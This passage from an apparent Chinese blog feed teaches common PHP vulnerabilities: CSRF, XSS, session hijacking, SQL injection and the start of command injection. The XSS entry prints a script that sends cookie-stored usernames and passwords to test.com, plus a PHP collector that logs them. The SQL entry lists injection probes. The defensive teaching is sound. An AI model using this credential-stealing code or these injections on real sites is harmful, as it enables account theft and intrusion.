<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">include_once(&quot;dlyz.php&quot;); </div><div class="line">include_once(&quot;../conn.php&quot;); </div><div class="line">if($_GET[&quot;act&quot;]) </div><div class="line">&#123; </div><div class="line">    if (!isset($_SESSION[&quot;post_id&quot;])) </div><div class="line">    &#123; </div><div class="line">        // 生成唯一的ID，并使用MD5来加密 </div><div class="line">        $post_id = md5(uniqid(rand(), true)); </div><div class="line">        // 创建Session变量 </div><div class="line">        $_SESSION[&quot;post_id&quot;] = $post_id; </div><div class="line">    &#125; </div><div class="line">// 检查是否相等 </div><div class="line">if (isset($_SESSION[&quot;post_id&quot;])) </div><div class="line">&#123; </div><div class="line">    // 不相等 </div><div class="line">    if ($_SESSION[&quot;post_id&quot;] != $_POST[&quot;post_id&quot;]) </div><div class="line">    &#123; </div><div class="line">        // 清除POST变量 </div><div class="line">        unset($_POST); </div><div class="line">        echo &quot;&lt;script language=’javascript’&gt;&quot;; </div><div class="line">        echo &quot;alert(‘数据来源异常!’);&quot;; </div><div class="line">        echo &quot; location=’index.php’;&quot;; </div><div class="line">        echo &quot;script&gt;&quot;; </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line">…… </div><div class="line">&lt;input type=&quot;reset&quot; name=&quot;Submit2&quot; value=&quot;重 置&quot;&gt; </div><div class="line">&lt;input type=&quot;hidden&quot; name=&quot;post_id&quot; value=&quot;php echo $_SESSION[&quot;post_id&quot;];?&gt;&quot;&gt; </div><div class="line"></div><div class="line">mysql_close($conn); </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="使用POST，不要使用GET"><a href="#使用POST，不要使用GET" class="headerlink" title="使用POST，不要使用GET"></a>使用POST，不要使用GET</h4><p>传递表单字段时，一定要是用POST，不要使用GET，处理变量也不要直接使用$_REQUEST</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;CSRF(Cross Site Request Forgeries)，意为跨网站请求伪造，也有写为XSRF。攻击者伪造目标用户的HTTP请求
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP|PHP漏洞全解-跨站脚本攻击XSS</title>
    <link href="http://yoursite.com/2018/03/24/PHP-PHP%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/"/>
    <id>http://yoursite.com/2018/03/24/PHP-PHP漏洞全解-跨站脚本攻击XSS/</id>
    <published>2018-03-24T00:29:09.000Z</published>
    <updated>2018-03-24T10:19:42.120Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>跨站脚本攻击(Cross Site Script为了区别于CSS简称为XSS)指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。</p>
<h3 id="一个简单的留言板"><a href="#一个简单的留言板" class="headerlink" title="一个简单的留言板"></a>一个简单的留言板</h3><p>我们有个页面用于允许用户发表留言，然后在页面底部显示留言列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;?php include(&apos;/components/headerinclude.php&apos;);?&gt;&lt;/head&gt;</div><div class="line">    &lt;style type=&quot;text/css&quot;&gt;</div><div class="line">        .comment-title&#123;</div><div class="line">            font-size:14px;</div><div class="line">            margin: 6px 0px 2px 4px;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        .comment-body&#123;</div><div class="line">            font-size: 14px;</div><div class="line">            color:#ccc;</div><div class="line">            font-style: italic;</div><div class="line">            border-bottom: dashed 1px #ccc;</div><div class="line">            margin: 4px;</div><div class="line">        &#125;</div><div class="line">    &lt;/style&gt;</div><div class="line">    &lt;script type=&quot;text/javascript&quot; src=&quot;/js/cookies.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;body&gt;</div><div class="line">    &lt;form method=&quot;post&quot; action=&quot;list.php&quot;&gt;</div><div class="line">        &lt;div style=&quot;margin:20px;&quot;&gt;</div><div class="line">            &lt;div style=&quot;font-size:16px;font-weight:bold;&quot;&gt;Your Comment&lt;/div&gt;</div><div class="line">            &lt;div style=&quot;padding:6px;&quot;&gt;</div><div class="line">                Nick Name:</div><div class="line">                &lt;br/&gt;</div><div class="line">                &lt;input name=&quot;name&quot; type=&quot;text&quot; style=&quot;width:300px;&quot;/&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">            &lt;div style=&quot;padding:6px;&quot;&gt;</div><div class="line">                Comment:</div><div class="line">                &lt;br/&gt;</div><div class="line">                &lt;textarea name=&quot;comment&quot; style=&quot;height:100px; width:300px;&quot;&gt;&lt;/textarea&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">            &lt;div style=&quot;padding-left:230px;&quot;&gt;</div><div class="line">                &lt;input type=&quot;submit&quot; value=&quot;POST&quot; style=&quot;padding:4px 0px; width:80px;&quot;/&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">            &lt;div style=&quot;border-bottom:solid 1px #fff;margin-top:10px;&quot;&gt;</div><div class="line">                &lt;div style=&quot;font-size:16px;font-weight:bold;&quot;&gt;Comments&lt;/div&gt;</div><div class="line">            &lt;/div&gt;</div><div class="line">            &lt;?php </div><div class="line">                require(&apos;/components/comments.php&apos;); </div><div class="line">                if(!empty($_POST[&apos;name&apos;]))&#123;</div><div class="line">                    addElement($_POST[&apos;name&apos;],$_POST[&apos;comment&apos;]);</div><div class="line">                &#125;</div><div class="line">                renderComments();</div><div class="line">            ?&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">    &lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>addElement()方法用于添加新的留言，而renderComments()方法用于展留言列表，网页看起来是这样的</p>
<p><img src="/images/PHP漏洞分析-跨站脚本XSS-01.png" alt="Wb" title="PHP漏洞分析-跨站脚本XSS-01"></p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>因为我们完全信任了用户输入，但有些别有用心的用户会像这样的输入</p>
<p><img src="/images/PHP漏洞分析-跨站脚本XSS-02.png" alt="用户输入" title="PHP漏洞分析-跨站脚本XSS-02"></p>
<p>这样无论是谁访问这个页面的时候控制台都会输出“Hey you are a fool fish!”，如果这只是个恶意的小玩笑，有些人做的事情就不可爱了，有些用户会利用这个漏洞窃取用户信息、诱骗人打开恶意网站或者下载恶意程序等，看个最简单的例子</p>
<h3 id="利用xss窃取用户名密码"><a href="#利用xss窃取用户名密码" class="headerlink" title="利用xss窃取用户名密码"></a>利用xss窃取用户名密码</h3><p>当然这个示例很简单，几乎攻击不到任何网站，仅仅看看其原理。我们知道很多登陆界面都有记住用户名、密码的功能方便用户下次登录，有些网站是直接用明文记录用户名、密码，恶意用户注册账户登录后使用简单工具查看cookie结构名称后，如果网站有xss漏洞，那么简单的利用jsonp就可以获取其它用户的用户名、密码了。</p>
<p>恶意用户会这么输入</p>
<p><img src="/images/PHP漏洞分析-跨站脚本XSS-03.png" alt="恶意输入" title="PHP漏洞分析-跨站脚本XSS-03"></p>
<p>我们看看<a href="http://test.com/hack.js里藏了什么" target="_blank" rel="external">http://test.com/hack.js里藏了什么</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var username=CookieHelper.getCookie(&apos;username&apos;).value;</div><div class="line">var password=CookieHelper.getCookie(&apos;password&apos;).value;</div><div class="line">var script =document.createElement(&apos;script&apos;);</div><div class="line">script.src=&apos;http://test.com/index.php?username=&apos;+username+&apos;&amp;password=&apos;+password;</div><div class="line">document.body.appendChild(script);</div></pre></td></tr></table></figure></p>
<p>几句简单的javascript，获取cookie中的用户名密码，利用jsonp把向<a href="http://test.com/index.php" target="_blank" rel="external">http://test.com/index.php</a></p>
<p>发送了一个get请求</p>
<p><a href="http://test.com/index.php" target="_blank" rel="external">http://test.com/index.php</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    if(!empty($_GET[&apos;password&apos;]))&#123;</div><div class="line">        $username=$_GET[&apos;username&apos;];</div><div class="line">        $password=$_GET[&apos;password&apos;];</div><div class="line">        </div><div class="line">        try&#123;</div><div class="line">            $path=$_SERVER[&quot;DOCUMENT_ROOT&quot;].&apos;/password.txt&apos;;</div><div class="line">            $fp=fopen($path,&apos;a&apos;);</div><div class="line">            flock($fp, LOCK_EX);</div><div class="line">            fwrite($fp, &quot;$username\t $password\r\n&quot;);</div><div class="line">            flock($fp, LOCK_UN);</div><div class="line">            fclose($fp);</div><div class="line">        &#125;catch(Exception $e)&#123;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>这样恶意用户就把访问留言板的用户的信息窃取了</p>
<h3 id="怎么预防"><a href="#怎么预防" class="headerlink" title="怎么预防"></a>怎么预防</h3><p>上面演示的是一个非常简单的XSS攻击，还有很多隐蔽的方式，但是其核心都是利用了脚本注入，因此我们解决办法其实很简单，不信赖用户输入，对特殊字符如”&lt;”,”&gt;”转义，就可以从根本上防止这一问题，当然很多解决方案都对XSS做了特定限制，如上面这中做法在ASP.NET中不幸不同，微软validateRequest对表单提交自动做了XSS验证。但防不胜防，总有些聪明的恶意用户会到我们的网站搞破坏，对自己站点不放心可以看看这个XSS跨站测试代码大全试试站点是否安全。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;跨站脚本攻击(Cross Site Script为了区别于CSS简称为XSS)指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP|PHP漏洞全解-Session会话劫持</title>
    <link href="http://yoursite.com/2018/03/24/PHP-PHP%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3-Session%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81/"/>
    <id>http://yoursite.com/2018/03/24/PHP-PHP漏洞全解-Session会话劫持/</id>
    <published>2018-03-24T00:06:48.000Z</published>
    <updated>2018-03-26T12:42:49.798Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>服务端和客户端之间是通过session(会话)来连接沟通。当客户端的浏览器连接到服务器后，服务器就会建立一个该用户的session。每个用户的session都是独立的，并且由服务器来维护。每个用户的session是由一个独特的字符串来识别，成为session id。用户发出请求时，所发送的http表头内包含session id 的值。服务器使用http表头内的session id来识别时哪个用户提交的请求。</p>
<p>session保存的是每个用户的个人数据，一般的web应用程序会使用session来保存通过验证的用户账号和密码。在转换不同的网页时，如果需要验证用户身份，就是用session内所保存的账号和密码来比较。session的生命周期从用户连上服务器后开始，在用户关掉浏览器或是注销时用户session_destroy函数删除session数据时结束。如果用户在20分钟内没有使用计算机的动作，session也会自动结束。</p>
<p>Session对于Web应用无疑是最重要的，也是最复杂的。对于web应用程序来说，加强安全性的第一条原则就是 – 不要信任来自客户端的数据，一定要进行数据验证以及过滤，才能在程序中使用，进而保存到数据层。 然而，为了维持来自同一个用户的不同请求之间的状态， 客户端必须要给服务器端发送一个唯一的身份标识符(Session ID)。 很显然，这和前面提到的安全原则是矛盾的，但是没有办法，http协议是无状态的，为了维持状态，我们别无选择。 可以看出，web应用程序中最脆弱的环节就是session，因为服务器端是通过来自客户端的一个身份标识来认证用户的， 所以session是web应用程序中最需要加强安全性的环节。　</p>
<p>同时，基于session的攻击有很多种方式。大部分的手段都是首先通过捕获合法用户的session, 然后冒充该用户来访问系统。也就是说，攻击者至少必须要获取到一个有效的session标识符，用于接下来的身份验证。</p>
<p>php处理session的应用架构:</p>
<p><img src="/images/PHP漏洞分析-Session会话劫持-01.jpeg" alt="Session架构" title="PHP漏洞分析-Session会话劫持-01"></p>
<h3 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h3><p>会话劫持是指攻击者利用各种手段来获取目标用户的session id。一旦获取到session id，那么攻击者可以利用目标用户的身份来登录网站，获取目标用户的操作权限。</p>
<p>攻击者获取目标用户session id的方法:</p>
<p>1）暴力破解:尝试各种session id，直到破解为止。<br>2）计算:如果session id使用非随机的方式产生，那么就有可能计算出来<br>3）窃取:使用网络截获，xss攻击等方法获得</p>
<p>对于PHP来说，其内部Session的实现机制虽然不是很安全，但是关于生成Session ID的环节还是比较安全的，这个随机的Session ID往往是极其复杂的并且难于被预测出来，所以，对于第一、第二种攻击方式基本上是不太可能成功的。</p>
<p>对于第三种方式大多使用网络数据通讯层进行攻击获取，可以使用SSL进行防御。</p>
<p>在应用层上也可以做出相应的防御措施：</p>
<p>目前有三种广泛使用的在Web环境中维护会话（传递Session ID）的方法：URL参数，隐藏域和Cookie。其中每一种都各有利弊，Cookie已经被证明是三种方法中最方便最安全的。从安全的观点，如果不是全部也是绝大多数针对基于Cookie的会话管理机制的攻击对于URL或是隐藏域机制同样适用，但是反过来却不一定，这就让Cookie成为从安全考虑的最佳选择。</p>
<p>会话劫持的攻击步骤:</p>
<p><img src="/images/PHP漏洞分析-Session会话劫持-02.jpeg" alt="劫持步骤" title="PHP漏洞分析-Session会话劫持-02"></p>
<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol>
<li><p>更改Session名称。PHP中Session的默认名称是PHPSESSID，此变量会保存在Cookie中，如果攻击者不分析站点，就不能猜到Session名称，阻挡部分攻击。</p>
</li>
<li><p>关闭透明化Session ID。透明化Session ID指当浏览器中的Http请求没有使用Cookie来存放Session ID时，Session ID则使用URL来传递。</p>
</li>
<li><p>设置HttpOnly。通过设置Cookie的HttpOnly为true，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击。</p>
</li>
<li><p>关闭所有phpinfo类dump request信息的页面。</p>
</li>
<li><p>验证HTTP头部信息</p>
</li>
</ol>
<p>在http访问头文件：[Accept-Charset、Accept-Encoding、Accept-Language、User-Agent]，浏览器一般发出的头部不会改</p>
<p>使用User-Agent检测请求的一致性:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">GET/HTTP/1.1</div><div class="line">host:example.org</div><div class="line">User-Agent:Firefox/1.0</div><div class="line">Accept:text/html,image/png,image/jpeg,image/gif,*/*</div><div class="line">Cookie:PHPSESSID=1234</div><div class="line">&lt;?php</div><div class="line">session_start();</div><div class="line">if(isset($_SESSION[&apos;HTTP_USER_AGENT&apos;]))&#123;    </div><div class="line">    if($_SESSION[&apos;HTTP_USER_AGENT&apos;]!=md5($_SERVER[&apos;HTTP_USER_AGENT&apos;]))&#123;</div><div class="line">                    /*Promptforpassword*/</div><div class="line">                   exit;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">else&#123;      </div><div class="line">　　$_SESSION[&apos;HTTP_USER_AGENT&apos;]=md5($_SERVER[&apos;HTTP_USER_AGENT&apos;]);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>确保User-Agent头部信息一致的确是有效的，如果会话标识通过cookie传递，攻击者能取得会话标识，他同时也能取得其它HTTP头部。由于cookie暴露与浏览器漏洞或跨站脚本漏洞相关，受害者需要访问攻击者的网站并暴露所有头部信息。则攻击者只需重建头部即可进行攻击了。</p>
<ol>
<li>加入Token校验。同样是用于检测请求的一致性，给攻击者制造一些麻烦，使攻击者即使获取了Session ID，也无法进行破坏，能够减少对系统造成的损失。但Token需要存放在客户端，如果攻击者有办法获取到Session ID，那么也同样可以获取到Token。</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;服务端和客户端之间是通过session(会话)来连接沟通。当客户端的浏览器连接到服务器后，服务器就会建立一个该用户的session。每个用户
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP|PHP漏洞全解-SQL注入攻击</title>
    <link href="http://yoursite.com/2018/03/24/PHP-PHP%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3-SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2018/03/24/PHP-PHP漏洞全解-SQL注入攻击/</id>
    <published>2018-03-23T23:43:54.000Z</published>
    <updated>2018-03-24T03:11:29.812Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>所谓的SQL注入攻击，即一部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据。</p>
<h3 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h3><p>SQL注入攻击(SQL Injection)，是攻击者在表单中提交精心构造的sql语句，改动原来的sql语句，如果web程序没有对提交的数据经过检查，那么就会造成sql注入攻击。</p>
<p>SQL注入攻击的一般步骤:</p>
<ol>
<li><p>攻击者访问有SQL注入漏洞的站点，寻找注入点</p>
</li>
<li><p>攻击者构造注入语句，注入语句和程序中的SQL语句结合生成新的sql语句</p>
</li>
<li><p>新的sql语句被提交到数据库中执行 处理</p>
</li>
<li><p>数据库执行了新的SQL语句，引发SQL注入攻击</p>
</li>
</ol>
<p><img src="/images/PHP漏洞分析-SQL注入攻击-01.jpeg" alt="SQL注入攻击" title="PHP漏洞分析-SQL注入攻击-01"></p>
<h3 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h3><p>来个初学者刚学PHP时通常会写的SQL语句，如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$query = &quot;select * from postmessage where id = &quot;.$_GET[&quot;id&quot;];</div><div class="line"></div><div class="line">$result = mysql_query($query)</div><div class="line"></div><div class="line">or die(&quot;执行ySQL查询语句失败：&quot; . mysql_error());</div></pre></td></tr></table></figure></p>
<p>如果用户的地址为 <a href="http://www.wduozhi.xyz/a.php?id=71" target="_blank" rel="external">http://www.wduozhi.xyz/a.php?id=71</a> and 1=1 和 <a href="http://www.wduozhi.xyz/a.php?id=71" target="_blank" rel="external">http://www.wduozhi.xyz/a.php?id=71</a> and 2=1,<br>参数id传递进来后，和前面的字符串结合的sql语句放入数据库执行 查询<br>提交 and 1=1，语句变成select <em> from postmessage where id = 71 and 1=1 这语句前值后值都为真，and以后也为真，返回查询到的数据<br>提交 and 1=2，语句变成select </em> from postmessage where id = 71 and 1=2 这语句前值为真，后值为假，and以后为假，查询不到任何数据<br>正常的SQL查询，经过我们构造的语句之后，形成了SQL注入攻击。通过这个注入点，我们还可以进一步拿到权限，比如说运用 union读取管理密码，读取数据库信息，或者用mysql的load_file，into outfile等函数进一步渗透。</p>
<h3 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h3><h4 id="整型参数"><a href="#整型参数" class="headerlink" title="整型参数:"></a>整型参数:</h4><p>运用 intval函数将数据转换成整数</p>
<p>函数原型</p>
<p>int intval(mixed var, int base)</p>
<p>var是要转换成整形的变量</p>
<p>base，可选，是基础数，默认是10</p>
<h4 id="浮点型参数"><a href="#浮点型参数" class="headerlink" title="浮点型参数:"></a>浮点型参数:</h4><p>运用 floatval或doubleval函数分别转换单精度和双精度浮点型参数</p>
<p>函数原型</p>
<p>int floatval(mixed var)</p>
<pre><code>var是要转换的变量
</code></pre><p>int doubleval(mixed var)</p>
<pre><code>var是要转换的变量
</code></pre><h4 id="字符型参数"><a href="#字符型参数" class="headerlink" title="字符型参数:"></a>字符型参数:</h4><p>运用 addslashes函数来将单引号“’”转换成“\’”，双引号“””转换成“\””，反斜杠“\”转换成“\”，NULL字符加上反斜杠“\”</p>
<p>函数原型</p>
<p>string addslashes (string str)</p>
<pre><code>str是要检查的字符串
</code></pre><p>那么刚才出现的代码漏洞，我们可以这样修补<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">// 执行mysql查询语句</div><div class="line"></div><div class="line">$query = &quot;select * from postmessage where id = &quot;.intval($_GET[&quot;id&quot;]);</div><div class="line"></div><div class="line">$result = mysql_query($query)</div><div class="line"></div><div class="line">or die(&quot;执行ySQL查询语句失败：&quot; . mysql_error());</div></pre></td></tr></table></figure></p>
<p>如果是字符型，先判断magic_quotes_gpc能无法 为On,当不为On的时候运用 addslashes转义特殊字符。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if(get_magic_quotes_gpc())&#123;  </div><div class="line">  　 $var = $_GET[&quot;var&quot;];  </div><div class="line">&#125;else&#123;  </div><div class="line">　   $var = addslashes($_GET[&quot;var&quot;]);  </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="使用预编译语句，避免sql注入"><a href="#使用预编译语句，避免sql注入" class="headerlink" title="使用预编译语句，避免sql注入"></a>使用预编译语句，避免sql注入</h4><p>注入是早前很大的一个问题，不过近些年因为大家比较重视这个问题，所以慢慢变得好了很多。</p>
<p>吴翰清在web白帽子里说的很好，其实很多漏洞，像sql注入或xss，都是将“数据”和“代码”没有区分开。“代码”是程序员写的内容，“数据”是用户可以改变的内容。如果我们写一个sql语句<strong>select * from admin where username=’admin’ password=’xxxxx’</strong>, admin和xxxxx就是数据，是用户输入的用户名和密码，但如果没有任何处理，用户输入的就可能是“代码”，比如’or ‘’=’，这样就造成了漏洞。“代码”是绝对不能让用户接触的。</p>
<p>在php中，对于mysql数据库有两个模块，mysql和mysqli，mysqli的意思就是mysql improve。mysql的改进版，这个模块中就含有“预编译”这个概念。像上面那个sql语句，改一改<strong>：select * from admin where username=’?’ password=’?’</strong>，它就不是一个sql语句了，但是可以通过mysqli的预编译功能先把他编译成stmt对象，在后期用户输入账号密码后，用stmt-&gt;bind_param将用户输入的“数据”绑定到这两个问号的位置。这样，用户输入的内容就只能是“数据”，而不可能变成“代码”。</p>
<p>这两个问号限定了“数据”的位置，以及sql语句的结构。我们可以把我们所有的数据库操作都封装到一个类中，所有sql语句的执行都进行预编译。这样就完全避免了sql注入，这也是吴翰清最推荐的解决方案。</p>
<p>下面是使用mysqli的一些代码部分(所有的判断函数运行成功或失败的代码我都省略了，但不代表不重要)：</p>
<pre><code>&lt;?php
//用户输入的数据
$name = &apos;admin&apos;;
$pass = &apos;123456&apos;;
//首先新建mysqli对象,构造函数参数中包含了数据库相关内容。
$conn = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME, DB_PORT);
//设置sql语句默认编码
$this-&gt;mysqli-&gt;set_charset(&quot;utf8&quot;);
//创建一个使用通配符的sql语句
$sql = &apos;SELECT user_id FROM admin WHERE username=? AND password=?;&apos;;
//编译该语句，得到一个stmt对象.
$stmt = $conn-&gt;prepare($sql);
/********************之后的内容就能重复利用，不用再次编译*************************/
//用bind_param方法绑定数据
//大家可以看出来，因为我留了两个?，也就是要向其中绑定两个数据，所以第一个参数是绑定的数据的类型(s=string,i=integer)，第二个以后的参数是要绑定的数据
$stmt-&gt;bind_param(&apos;ss&apos;, $name, $pass);
//调用bind_param方法绑定结果（如果只是检查该用户与密码是否存在，或只是一个DML语句的时候，不用绑定结果）
//这个结果就是我select到的字段，有几个就要绑定几个
$stmt-&gt;bind_result($user_id);
//执行该语句
$stmt-&gt;execute();
//得到结果
if($stmt-&gt;fetch()){
    echo &apos;登陆成功&apos;;
    //一定要注意释放结果资源，否则后面会出错
    $stmt-&gt;free_result();
    return $user_id; //返回刚才select到的内容
}else{echo &apos;登录失败&apos;;}
?&gt;
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;所谓的SQL注入攻击，即一部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP|PHP漏洞全解-命令注入攻击</title>
    <link href="http://yoursite.com/2018/03/24/PHP-PHP%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2018/03/24/PHP-PHP漏洞全解-命令注入攻击/</id>
    <published>2018-03-23T22:58:53.000Z</published>
    <updated>2018-03-23T16:36:56.560Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Command Injection，即命令注入攻击，是指这样一种攻击手段，黑客通过把HTML代码输入一个输入机制(例如缺乏有效验证限制的表格域)来改变网页的动态生成的内容。使用系统命令是一项危险的操作，尤其在你试图使用远程数据来构造要执行的命令时更是如此。如果使用了被污染数据，命令注入漏洞就产生了。</p>
<h3 id="命令注入攻击"><a href="#命令注入攻击" class="headerlink" title="命令注入攻击"></a>命令注入攻击</h3><p>PHP中可以使用下列5个函数来执行外部的应用程序或函数</p>
<p>system、exec、passthru、shell_exec、“(与shell_exec功能相同)</p>
<p>函数原型</p>
<p><strong>string system(string command, int &amp;return_var)</strong></p>
<ul>
<li>command 要执行的命令</li>
<li>return_var 存放执行命令的执行后的状态值</li>
</ul>
<p><strong>string exec (string command, array &amp;output, int &amp;return_var)</strong></p>
<ul>
<li>command 要执行的命令</li>
<li>output 获得执行命令输出的每一行字符串</li>
<li>return_var 存放执行命令后的状态值</li>
</ul>
<p><strong>void passthru (string command, int &amp;return_var)</strong></p>
<ul>
<li>command 要执行的命令</li>
<li>return_var 存放执行命令后的状态值</li>
<li>string shell_exec (string command)</li>
<li>command 要执行的命令</li>
</ul>
